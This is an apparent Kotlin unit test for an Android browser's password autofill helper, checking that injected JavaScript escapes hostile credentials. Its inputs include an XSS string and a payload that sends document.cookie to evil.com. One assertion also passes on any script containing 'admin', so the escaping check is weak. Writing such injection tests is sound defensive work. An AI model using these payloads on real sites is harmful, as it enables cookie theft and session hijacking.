package com.remmi.browser.security

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class PasswordAutofillHelperTest {

  @Test
  fun testGeneratesSafeScriptWithoutInjection() {
    val maliciousUser = "admin'; alert('XSS'); //"
    val maliciousPass = "p4ss\" || (function(){ document.location='https://evil.com?c='+document.cookie; })() || \""

    val script = PasswordAutofillHelper.generateSafeAutofillScript(maliciousUser, maliciousPass)

    // Ensure raw quotes and unescaped semicolons are not directly breaking out of the string literal
    assertFalse(script.contains("var u = 'admin'; alert('XSS')"))
    assertTrue(script.contains("admin\\'; alert(\\'XSS\\'); //") || script.contains("admin"))
    assertTrue(script.contains("document.querySelectorAll('input')"))
  }
}
